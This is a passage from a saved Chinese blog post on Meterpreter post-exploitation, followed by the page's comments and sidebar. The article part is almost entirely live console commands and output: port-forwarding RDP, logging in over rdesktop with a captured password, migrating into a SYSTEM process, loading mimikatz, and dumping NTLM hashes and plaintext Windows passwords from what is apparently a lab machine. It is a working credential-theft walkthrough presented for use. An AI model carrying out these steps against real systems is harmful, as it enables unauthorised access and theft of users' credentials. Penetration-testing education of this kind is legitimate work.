<p>meterpreter&nbsp;&gt;&nbsp;portfwd&nbsp;add&nbsp;-L&nbsp;1234&nbsp;-p&nbsp;3389&nbsp;-r&nbsp;192.168.111.133</p>
<p>[-]&nbsp;You&nbsp;must&nbsp;supply&nbsp;a&nbsp;local&nbsp;port,&nbsp;remote&nbsp;host,&nbsp;and&nbsp;remote&nbsp;port.</p>
<p>meterpreter&nbsp;&gt;&nbsp;portfwd&nbsp;add&nbsp;-l&nbsp;1234&nbsp;-p&nbsp;3389&nbsp;-r&nbsp;192.168.111.133</p>
<p>[*]&nbsp;Local&nbsp;TCP&nbsp;relay&nbsp;created:&nbsp;0.0.0.0:1234&nbsp;&lt;-&gt;&nbsp;192.168.111.133:3389</p>
<p>meterpreter&nbsp;&gt;</p>
<p>接下来运行</p>
<p>rdesktop&nbsp;-u&nbsp;zero&nbsp;-p&nbsp;haizeiwang123_&nbsp;127.0.0.1:1234</p>
<p>(6).获取密码<br>法国神器mimikatz可以直接获得操作系统的明文密码<span lang="EN-US&gt;">,meterpreter</span>添加了这个模块<br>首先加载mimikatz模块<br>由于我的Windows 2008是64位的，所以先要转移到<span lang="EN-US&gt;">64</span>位进程</p>
<p>meterpreter&nbsp;&gt;&nbsp;ps</p>
<p>&nbsp;</p>
<p>......</p>
<p>2000&nbsp;&nbsp;472&nbsp;&nbsp;&nbsp;dllhost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32dllhost.exe</p>
<p>2264&nbsp;&nbsp;1832&nbsp;&nbsp;explorer.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEzero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:Windowsexplorer.exe</p>
<p>2292&nbsp;&nbsp;2264&nbsp;&nbsp;vmtoolsd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEzero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:Program&nbsp;FilesVMwareVMware&nbsp;Toolsvmtoolsd.exe</p>
<p>2520&nbsp;&nbsp;372&nbsp;&nbsp;&nbsp;FfBoPtYGlNj.exe&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEAdministrator&nbsp;&nbsp;C:UsersADMINI~1AppDataLocalTemp1rad87A98.tmpFfBoPtYGlNj.exe</p>
<p>2780&nbsp;&nbsp;2256&nbsp;&nbsp;winlogon.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYSYSTEM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32winlogon.exe</p>
<p>3028&nbsp;&nbsp;880&nbsp;&nbsp;&nbsp;dwm.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_64&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCEzero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32dwm.exe</p>
<p>&nbsp;</p>
<p>meterpreter&nbsp;&gt;&nbsp;migrate&nbsp;2780</p>
<p>[*]&nbsp;Removing&nbsp;existing&nbsp;TCP&nbsp;relays...</p>
<p>[*]&nbsp;Successfully&nbsp;stopped&nbsp;TCP&nbsp;relay&nbsp;on&nbsp;0.0.0.0:1234</p>
<p>[*]&nbsp;1&nbsp;TCP&nbsp;relay(s)&nbsp;removed.</p>
<p>[*]&nbsp;Migrating&nbsp;from&nbsp;1428&nbsp;to&nbsp;2264...</p>
<p>[*]&nbsp;Migration&nbsp;completed&nbsp;successfully.</p>
<p>[*]&nbsp;Recreating&nbsp;TCP&nbsp;relay(s)...</p>
<p>[*]&nbsp;Local&nbsp;TCP&nbsp;relay&nbsp;recreated:&nbsp;0.0.0.0:1234&nbsp;&lt;-&gt;&nbsp;192.168.111.133:3389</p>
<p>meterpreter&nbsp;&gt;&nbsp;load&nbsp;mimikatz</p>
<p>Loading&nbsp;extension&nbsp;mimikatz...success.</p>
<p>meterpreter&nbsp;&gt;</p>
<p>获取密码哈希<span lang="EN-US&gt;">:</span></p>
<p>meterpreter&nbsp;&gt;&nbsp;msv</p>
<p>[+]&nbsp;Running&nbsp;as&nbsp;SYSTEM</p>
<p>[*]&nbsp;Retrieving&nbsp;msv&nbsp;credentials</p>
<p>msv&nbsp;credentials</p>
<p>===============</p>
<p>&nbsp;</p>
<p>AuthID&nbsp;&nbsp;&nbsp;&nbsp;Package&nbsp;&nbsp;&nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Password</p>
<p>------&nbsp;&nbsp;&nbsp;&nbsp;-------&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------</p>
<p>0;339062&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE&nbsp;&nbsp;Administrator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm{&nbsp;179b3f1af1324ade301c14040883a0d8&nbsp;},&nbsp;ntlm{&nbsp;358c0a328bdf6b42185ca0a1773fb0be&nbsp;}</p>
<p>0;593431&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE&nbsp;&nbsp;zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm{&nbsp;bc61a4bbe791e26298911297f380ff1b&nbsp;},&nbsp;ntlm{&nbsp;880be0798a0d1caebdf913bfcc28e1ad&nbsp;}</p>
<p>0;593459&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE&nbsp;&nbsp;zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm{&nbsp;bc61a4bbe791e26298911297f380ff1b&nbsp;},&nbsp;ntlm{&nbsp;880be0798a0d1caebdf913bfcc28e1ad&nbsp;}</p>
<p>0;995&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;NT&nbsp;AUTHORITY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IUSR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.s.&nbsp;(Credentials&nbsp;KO)</p>
<p>0;996&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE$&nbsp;&nbsp;n.s.&nbsp;(Credentials&nbsp;KO)</p>
<p>0;997&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;NT&nbsp;AUTHORITY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOCAL&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.s.&nbsp;(Credentials&nbsp;KO)</p>
<p>0;47971&nbsp;&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.s.&nbsp;(Credentials&nbsp;KO)</p>
<p>0;999&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE$&nbsp;&nbsp;n.s.&nbsp;(Credentials&nbsp;KO)</p>
<p>获取明文密码</p>
<p>meterpreter&nbsp;&gt;&nbsp;kerberos</p>
<p>[+]&nbsp;Running&nbsp;as&nbsp;SYSTEM</p>
<p>[*]&nbsp;Retrieving&nbsp;kerberos&nbsp;credentials</p>
<p>kerberos&nbsp;credentials</p>
<p>====================</p>
<p>&nbsp;</p>
<p>AuthID&nbsp;&nbsp;&nbsp;&nbsp;Package&nbsp;&nbsp;&nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Password</p>
<p>------&nbsp;&nbsp;&nbsp;&nbsp;-------&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------</p>
<p>0;999&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE$</p>
<p>0;996&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE$</p>
<p>0;47971&nbsp;&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>0;997&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;NT&nbsp;AUTHORITY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOCAL&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>0;995&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;&nbsp;NT&nbsp;AUTHORITY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IUSR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>0;339062&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE&nbsp;&nbsp;Administrator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ceshimima123_</p>
<p>0;593459&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE&nbsp;&nbsp;zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;haizeiwang123_</p>
<p>0;593431&nbsp;&nbsp;NTLM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN-K30V5SI0PCE&nbsp;&nbsp;zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;haizeiwang123_</p>
<p>&nbsp;</p>
<div id="wiz-table-col-line">&nbsp;</div>
<div id="wiz-table-row-line">&nbsp;</div>
<div id="wiz-table-range-border_start">&nbsp;</div>
<div id="wiz-table-range-border_range">&nbsp;</div>
</div>
<div id="MySignature"></div>
<div class="clear"></div>
<div id="blog_post_info_block"><div id="BlogPostCategory">
    分类: 
            <a href="https://www.cnblogs.com/backlion/category/900352.html" target="_blank">内网渗透</a></div>


    <div id="blog_post_info">
<div id="green_channel">
        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(9484949,cb_blogId,1);green_channel_success(this,'谢谢推荐！');">好文要顶</a>
        <a id="green_channel_follow" onclick="follow('cdf9cbfa-429b-e611-845c-ac853d9f53ac');" href="javascript:void(0);">关注我</a>
    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/icon_weibo_24.png" alt=""></a>
    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/wechat.png" alt=""></a>
</div>
<div id="author_profile">
    <div id="author_profile_info" class="author_profile_info">
            <a href="https://home.cnblogs.com/u/backlion/" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/20170429193445.png" class="author_avatar" alt=""></a>
        <div id="author_profile_detail" class="author_profile_info">
            <a href="https://home.cnblogs.com/u/backlion/">渗透测试中心</a><br>
            <a href="https://home.cnblogs.com/u/backlion/followees/">关注 - 0</a><br>
            <a href="https://home.cnblogs.com/u/backlion/followers/">粉丝 - 316</a>
        </div>
    </div>
    <div class="clear"></div>
    <div id="author_profile_honor"></div>
    <div id="author_profile_follow">
                <a href="javascript:void(0);" onclick="follow('cdf9cbfa-429b-e611-845c-ac853d9f53ac');return false;">+加关注</a>
    </div>
</div>
<div id="div_digg">
    <div class="diggit" onclick="votePost(9484949,'Digg')">
        <span class="diggnum" id="digg_count">4</span>
    </div>
    <div class="buryit" onclick="votePost(9484949,'Bury')">
        <span class="burynum" id="bury_count">0</span>
    </div>
    <div class="clear"></div>
    <div class="diggword" id="digg_tips">
    </div>
</div>

<script type="text/javascript">
    currentDiggType = 0;
</script></div>
    <div class="clear"></div>
    <div id="post_next_prev">

    <a href="https://www.cnblogs.com/backlion/p/9479159.html" class="p_n_p_prefix">« </a> 上一篇：    <a href="https://www.cnblogs.com/backlion/p/9479159.html" title="发布于 2018-08-15 03:21">命令执行和代码执行漏洞详解</a>
    <br>
    <a href="https://www.cnblogs.com/backlion/p/9484950.html" class="p_n_p_prefix">» </a> 下一篇：    <a href="https://www.cnblogs.com/backlion/p/9484950.html" title="发布于 2018-08-16 03:03">Meterpreter提权详解</a>

</div>
</div>
		</div>
		<div class="postDesc">posted @ 
<span id="post-date">2018-08-16 02:56</span>&nbsp;
<a href="https://www.cnblogs.com/backlion/">渗透测试中心</a>&nbsp;
阅读(<span id="post_view_count">51398</span>)&nbsp;
评论(<span id="post_comment_count">4</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=9484949" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(9484949);return false;">收藏</a></div>
	</div>
	
	
</div><!--end: topics 文章、评论容器-->
<script src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/highlight.js"></script>
<script>markdown_highlight();</script>
<script>
    var allowComments = true, cb_blogId = 313482, cb_blogApp = 'backlion', cb_blogUserGuid = 'cdf9cbfa-429b-e611-845c-ac853d9f53ac';
    var cb_entryId = 9484949, cb_entryCreatedDate = '2018-08-16 02:56', cb_postType = 1; 
    loadViewCount(cb_entryId);
    loadSideColumnAd();
</script><a name="!comments"></a>
<div id="blog-comments-placeholder">

<div id="comment_pager_top">
    
</div>

<!--done-->
<br>
<div class="feedback_area_title">评论</div>
<div class="feedbackNoItems"><div class="feedbackNoItems"></div></div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;

<span class="comment_actions">
    
    
    
    
</span>


				</div>
				
<a href="#4121931" class="layer">#1楼</a>
<a name="4121931" id="comment_anchor_4121931"></a>


<span class="comment_date">2018-11-24 20:16</span>

 | 

            <a id="a_comment_author_4121931" href="https://home.cnblogs.com/u/1234006/" target="_blank">weigr</a>

			</div>
			<div class="feedbackCon">
				
<div id="comment_body_4121931" data-format-type="Ubb" class="blog_comment_body cnblogs-ubb">
    大佬啊,幸苦
</div>
        <div class="comment_vote">
            <span class="comment_error" style="color: red"></span>
            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(4121931, 'Digg', this.parentElement, false);">
                支持(0)
            </a>
            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(4121931, 'Bury', this.parentElement, false);">
                反对(0)
            </a>
        </div>
        

			</div>
		</div>
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;

<span class="comment_actions">
    
    
    
    
</span>


				</div>
				
<a href="#4237259" class="layer">#2楼</a>
<a name="4237259" id="comment_anchor_4237259"></a>


<span class="comment_date">2019-04-22 13:33</span>

 | 

            <a id="a_comment_author_4237259" href="https://www.cnblogs.com/useror/" target="_blank">杂食蜘蛛</a>

			</div>
			<div class="feedbackCon">
				
<div id="comment_body_4237259" data-format-type="Ubb" class="blog_comment_body cnblogs-ubb">
    感谢师傅的详细步骤
</div>
        <div class="comment_vote">
            <span class="comment_error" style="color: red"></span>
            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(4237259, 'Digg', this.parentElement, false);">
                支持(0)
            </a>
            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(4237259, 'Bury', this.parentElement, false);">
                反对(0)
            </a>
        </div>
        <span id="comment_4237259_avatar" style="display:none">
            https://pic.cnblogs.com/face/1030371/20160921153734.png
        </span>

			</div>
		</div>
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;

<span class="comment_actions">
    
    
    
    
</span>


				</div>
				
<a href="#4289795" class="layer">#3楼</a>
<a name="4289795" id="comment_anchor_4289795"></a>


<span class="comment_date">2019-06-29 10:52</span>

 | 

            <a id="a_comment_author_4289795" href="https://www.cnblogs.com/overlows/" target="_blank">芷恬</a>

			</div>
			<div class="feedbackCon">
				
<div id="comment_body_4289795" data-format-type="Ubb" class="blog_comment_body cnblogs-ubb">
    感谢大佬
</div>
        <div class="comment_vote">
            <span class="comment_error" style="color: red"></span>
            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(4289795, 'Digg', this.parentElement, false);">
                支持(0)
            </a>
            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(4289795, 'Bury', this.parentElement, false);">
                反对(0)
            </a>
        </div>
        <span id="comment_4289795_avatar" style="display:none">
            https://pic.cnblogs.com/face/979182/20190405155038.png
        </span>

			</div>
		</div>
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;

<span class="comment_actions">
    
    
    
    
</span>


				</div>
				
<a href="#4315925" class="layer">#4楼</a>
<a name="4315925" id="comment_anchor_4315925"></a>

        <span id="comment-maxId" style="display:none">4315925</span>
        <span id="comment-maxDate" style="display:none">2019/8/2 下午11:36:15</span>

<span class="comment_date">2019-08-02 23:36</span>

 | 

            <a id="a_comment_author_4315925" href="https://www.cnblogs.com/Smoke-star/" target="_blank">Антон</a>

			</div>
			<div class="feedbackCon">
				
<div id="comment_body_4315925" data-format-type="Ubb" class="blog_comment_body cnblogs-ubb">
    神啦
</div>
        <div class="comment_vote">
            <span class="comment_error" style="color: red"></span>
            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(4315925, 'Digg', this.parentElement, false);">
                支持(0)
            </a>
            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(4315925, 'Bury', this.parentElement, false);">
                反对(0)
            </a>
        </div>
        <span id="comment_4315925_avatar" style="display:none">
            https://pic.cnblogs.com/face/1269891/20191018160220.png
        </span>

			</div>
		</div>

<div id="comment_pager_bottom">
    
</div>


</div>
<script>
    var commentManager = new blogCommentManager();
    commentManager.renderComments(0);
</script>
<div id="comment_form" class="commentform">
    <a name="commentform"></a>
    <div id="divCommentShow"></div>
    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
    <div id="comment_form_container" style="visibility: visible;"><div class="login_tips">
    注册用户登录后才能发表评论，请 
    <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return login('commentform');">登录</a>
     或 
    <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return register();">注册</a>，
    <a href="https://www.cnblogs.com/">访问</a> 网站首页。
</div></div>
    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
    <div id="ad_t2"><a href="http://www.ucancode.com/index.htm" target="_blank" onclick="ga('send', 'event', 'Link', 'click', 'T2-ucancode')">【推荐】超50万行VC++源码: 大型组态工控、电力仿真CAD与GIS源码库</a><br><a href="https://brands.cnblogs.com/huawei" target="_blank" onclick="ga('send', 'event', 'Link', 'click', 'T2-华为专区')">【推荐】了不起的开发者，挡不住的华为，园子里的品牌专区</a><br><a href="https://ai.youdao.com/third-anniversary.s?keyfrom=cnblogs" target="_blank" onclick="ga('send', 'event', 'Link', 'click', 'T2-网易有道')">【推荐】有道智云周年庆，API服务大放送，注册即送100元体验金！</a><br><a href="https://developer.aliyun.com/ask/289308?utm_content=g_1000133217" target="_blank" onclick="ga('send', 'event', 'Link', 'click', 'T2-阿里云开发者社区')">【推荐】史上最全 Vue 面试题汇总</a><br></div>
    <div id="opt_under_post"></div>
    <div id="cnblogs_c1" class="c_ad_block"><a href="https://ai.youdao.com/third-anniversary.s?keyfrom=cnblogs" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/2016690-20200717105942214-957138008.png" alt="有道智云周年庆" onclick="ga('send', 'event', 'Link', 'click', 'C1-网易有道');" width="300" height="250"></a></div>
    <div id="under_post_news"><div class="recomm-block"><b>相关博文：</b><br>·  <a title="Msf的一些常用操作" href="https://www.cnblogs.com/hookjoy/p/7989715.html" target="_blank" onclick="clickRecomItmem(7989715)">Msf的一些常用操作</a><br>·  <a title="metasploit 渗透测试笔记(meterpreter篇)" href="https://www.cnblogs.com/h4ck0ne/p/5154581.html" target="_blank" onclick="clickRecomItmem(5154581)">metasploit 渗透测试笔记(meterpreter篇)</a><br>·  <a title="metasploit常用的一些命令，来自对官方文档自己的理解" href="https://www.cnblogs.com/poise/p/9065950.html" target="_blank" onclick="clickRecomItmem(9065950)">metasploit常用的一些命令，来自对官方文档自己的理解</a><br>·  <a title="meterpreter基本命令" href="https://www.cnblogs.com/wil-dong/p/10294076.html" target="_blank" onclick="clickRecomItmem(10294076)">meterpreter基本命令</a><br>·  <a title="meterpreter会话渗透利用常用的32个命令归纳小结" href="https://www.cnblogs.com/zhencool/p/10846849.html" target="_blank" onclick="clickRecomItmem(10846849)">meterpreter会话渗透利用常用的32个命令归纳小结</a><br>»  <a target="_blank" href="https://recomm.cnblogs.com/blogpost/9484949">更多推荐...</a></div></div>
    <div id="cnblogs_c2" class="c_ad_block" style="display: none;">
        <div id="div-gpt-ad-1592366332455-0" style="width: 468px; height: 60px;"></div>
    </div>
    <div id="under_post_kb">
<div class="itnews c_ad_block">
    <b>最新 IT 新闻</b>:
    <br>
 ·              <a href="https://news.cnblogs.com/n/668524/" target="_blank">LG计划今年晚些时候推出一款价格实惠的5G智能手机</a>
            <br>
 ·              <a href="https://news.cnblogs.com/n/668523/" target="_blank">苹果1亿美元收购加拿大公司：可将iPhone转为支付终端</a>
            <br>
 ·              <a href="https://news.cnblogs.com/n/668522/" target="_blank">一文读懂TikTok在美被禁风波：微软仍要收购 字节跳动称遭FB抹黑</a>
            <br>
 ·              <a href="https://news.cnblogs.com/n/668521/" target="_blank">雷军十年演讲主题官宣：一碗滚烫的小米粥 开启了沸腾的十年</a>
            <br>
 ·              <a href="https://news.cnblogs.com/n/668520/" target="_blank">白给：腾讯视频VIP+苏宁Super会员仅98元 返100元无敌券</a>
            <br>
    » <a href="https://news.cnblogs.com/" title="IT 新闻" target="_blank">更多新闻...</a>
</div></div>
    <div id="HistoryToday" class="c_ad_block"></div>
    <script type="text/javascript">
        fixPostBody();
        deliverBigBanner();
setTimeout(function() { incrementViewCount(cb_entryId); }, 50);        deliverT2();
        deliverC1C2();
        loadNewsAndKb();
        loadBlogSignature();
LoadPostCategoriesTags(cb_blogId, cb_entryId);        LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
        GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
        loadOptUnderPost();
        GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
    </script>
</div></div>


	</div><!--end: forFlow -->
	</div><!--end: mainContent 主体内容容器-->

	<div id="sideBar">
		<div id="sideBarMain">
			
<div id="sidebar_news" class="newsItem"><!--done-->
<div class="newsItem">
<h3 class="catListTitle">公告</h3>
	
<div id="blog-news">
    <span><font color="red"> <b>本博客长期更新渗透测试以及内网渗透和漏洞复现等文章，第一时间会在小蜜圈进行更新.&nbsp;&nbsp;root@backlin.org</b></font></span>

<img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/o_xmq.jpg" alt="backlion" height="254">
    <div id="profile_block">
        昵称：
        <a href="https://home.cnblogs.com/u/backlion/">
            渗透测试中心
        </a>
        <br>
        园龄：
        <a href="https://home.cnblogs.com/u/backlion/" title="入园时间：2016-10-26">
            3年9个月
        </a>
        <br>
        粉丝：
        <a href="https://home.cnblogs.com/u/backlion/followers/">
            316
        </a>
        <br>
        关注：
        <a href="https://home.cnblogs.com/u/backlion/followees/">
            0
        </a>
        <div id="p_b_follow">
